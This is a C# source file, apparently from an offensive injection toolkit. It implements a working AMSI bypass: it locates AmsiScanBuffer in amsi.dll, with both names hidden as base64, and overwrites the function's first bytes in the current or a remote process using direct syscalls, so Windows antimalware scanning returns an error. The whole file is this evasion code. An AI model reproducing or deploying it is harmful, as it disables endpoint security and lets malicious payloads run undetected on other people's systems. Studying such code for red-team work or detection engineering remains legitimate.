using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class AM51
    {
        // mov    eax,0x80070057 (E_INVALIDARG); ret
        static readonly byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        //static readonly byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        // xor rax, rax
        //static readonly byte[] x64 = new byte[] { 0x48, 0x31, 0xC0 };

        public static void Patch(IntPtr processHandle = default(IntPtr), int processID = 0)
        {
            ChangeBytes(x64, processHandle, processID);
        }

        static void ChangeBytes(byte[] patch, IntPtr processHandle, int processID)
        {
            try
            {
                #region GetLibraryAddress

                // "amsi.dll"
                var libNameB64 = new char[] { 'Y', 'W', '1', 'z', 'a', 'S', '5', 'k', 'b', 'G', 'w', '=' };
                var libName = Encoding.UTF8.GetString(Convert.FromBase64String(string.Join("", libNameB64)));

                // "AmsiScanBuffer"
                var funcNameB64 = new char[] { 'Q', 'W', '1', 'z', 'a', 'V', 'N', 'j', 'Y', 'W', '5', 'C', 'd', 'W', 'Z', 'm', 'Z', 'X', 'I', '=' };
                var funcName = Encoding.UTF8.GetString(Convert.FromBase64String(string.Join("", funcNameB64)));

                var baseAddress = IntPtr.Zero;
                try
                {
                    baseAddress = DI.DynamicInvoke.Generic.GetLibraryAddress(libName, funcName, CanLoadFromDisk: false);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"(AM51) [!] {e.Message}, skipping");
                    return;
                }

                if (processHandle != IntPtr.Zero) // if targeting a remote process, calculate remote address of AmsiScanBuffer
                {
                    var libAddress = DI.DynamicInvoke.Generic.GetLoadedModuleAddress(libName);
                    var offset = (long)baseAddress - (long)libAddress;

                    var dllNotFound = true;
                    using var process = Process.GetProcessById(processID);

                    foreach (ProcessModule module in process.Modules)
                    {
                        if (!module.ModuleName.Equals(libName, StringComparison.OrdinalIgnoreCase)) continue;

                        baseAddress = new IntPtr((long)module.BaseAddress + offset);
                        dllNotFound = false;
                        break;
                    }

                    if (dllNotFound)
                    {
                        Console.WriteLine("(AM51) [!] DLL not found in remote process, skipping");
                        return;
                    }
                }

                #endregion

                #region NtProtectVirtualMemory (PAGE_READWRITE)

                IntPtr protectAddress = baseAddress;
                var regionSize = (IntPtr)patch.Length;
                uint oldProtect = 0;

                var ntstatus = Syscalls.NtProtectVirtualMemory(
                    processHandle,
                    ref protectAddress,
                    ref regionSize,
                    DI.Data.Win32.WinNT.PAGE_READWRITE,
                    ref oldProtect);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(AM51) [+] NtProtectVirtualMemory, PAGE_READWRITE");
                else
                    throw new Exception($"(AM51) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");

                #endregion

                if (processHandle != IntPtr.Zero) // if targeting a remote process, use NtWriteVirtualMemory
                {
                    #region NtWriteVirtualMemory (patch)

                    var buffer = Marshal.AllocHGlobal(patch.Length);
                    Marshal.Copy(patch, 0, buffer, patch.Length);

                    uint bytesWritten = 0;

                    Console.WriteLine("(AM51) [>] Patching in remote process at address: " + string.Format("{0:X}", baseAddress.ToInt64()));
                    ntstatus = Syscalls.NtWriteVirtualMemory(
                        processHandle,
                        baseAddress,
                        buffer,
                        (uint)patch.Length,
                        ref bytesWritten);

                    if (ntstatus == NTSTATUS.Success)
                        Console.WriteLine("(AM51) [+] NtWriteVirtualMemory, patch");
                    else
                        throw new Exception($"(AM51) [-] NtWriteVirtualMemory, patch: {ntstatus}");

                    Marshal.FreeHGlobal(buffer);

                    #endregion
                }
                else // otherwise (current process), use Copy
                {
                    Console.WriteLine("(AM51) [>] Patching in current process at address: " + string.Format("{0:X}", baseAddress.ToInt64()));
                    Marshal.Copy(patch, 0, baseAddress, patch.Length);
                }

                #region NtProtectVirtualMemory (oldProtect)

                regionSize = (IntPtr)patch.Length;
                uint tmpProtect = 0;

                ntstatus = Syscalls.NtProtectVirtualMemory(
                    processHandle,
                    ref baseAddress,
                    ref regionSize,
                    oldProtect,
                    ref tmpProtect);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(AM51) [+] NtProtectVirtualMemory, oldProtect");
                else
                    throw new Exception($"(AM51) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

                #endregion
            }
            catch (Exception e)
            {
                Console.WriteLine($"(AM51) [x] {e.Message}");
                Console.WriteLine($"(AM51) [x] {e.InnerException}");
            }
        }
    }
}
